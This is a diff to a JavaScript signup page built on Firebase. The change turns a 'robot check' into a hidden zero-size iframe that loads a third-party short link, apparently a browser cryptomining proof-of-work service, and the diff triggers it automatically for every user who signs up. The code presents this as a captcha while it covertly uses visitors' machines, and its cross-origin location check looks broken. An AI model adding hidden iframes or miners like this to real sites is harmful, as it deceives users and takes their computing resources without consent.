@@ -25,7 +25,7 @@ function advance() {
 }
 
 function testRobot() {
-    document.getElementById("pend").innerHTML = "<iframe id='pendCheck' src='https://liveg-technologies.github.io/auroraservice/bbotdone.html'></iframe>";
+    document.getElementById("pend").innerHTML = "<iframe id='pendCheck' src='https://cnhv.co/22gwq' width='0' height='0'></iframe>";
     setInterval(function() {
         if (document.getElementById("pendCheck").contentWindow.location.href == "https://liveg-technologies.github.io/auroraservice/bbotdone.html") {
             pbMove("pb", 100, function() {
@@ -88,22 +88,25 @@ function login() {
 
 function signupBefore() {
     document.getElementById("error").innerHTML = "";
-    if(checkFields()) {
+    if (checkFields()) {
         document.getElementById("login").style.display = "none";
         document.getElementById("signup").style.display = "unset";
         document.getElementById("logout").style.display = "none";
     }
+    testRobot();
     setInterval(advance, 2000);
 }
 
 function signup() {
     document.getElementById("error").innerHTML = "";
-    if(checkUsername()) {
+    if (checkUsername() && document.getElementById("pbLabel").innerHTML == "You're not a robot!") {
         firebase.auth().createUserWithEmailAndPassword(document.getElementById("user").value, document.getElementById("pass").value).then(function() {
             firebase.database().ref("users/" + firebase.auth().currentUser.uid + "/_settings/name").set(document.getElementById("name").value);
         }).catch(function(error) {
             document.getElementById("error").innerHTML = "Oops! " + error.message.replace(/email/g, "e-mail").replace(/E-mail/g, "E-mail");
         });
+    } else if (document.getElementById("pbLabel").innerHTML != "You're not a robot!") {
+        document.getElementById("error").innerHTML = "Oops! We're still checking to see if you're a robot. Please hang on!";
     }
 }
 
